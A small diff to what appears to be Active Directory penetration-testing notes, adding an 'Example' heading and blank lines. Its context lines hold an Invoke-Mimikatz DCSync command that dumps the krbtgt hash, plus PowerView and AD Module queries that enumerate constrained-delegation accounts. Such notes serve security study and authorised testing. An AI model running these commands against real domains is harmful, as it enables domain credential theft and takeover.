@@ -318,6 +318,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 
 
+**_Example_**
+
+
 
 - Enumerate users and computers with constrained delegation enabled
 
@@ -330,3 +333,8 @@ Get-DomainComputer -TrustedToAuth
 # AD Module
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 ```
+
+
+
+
+
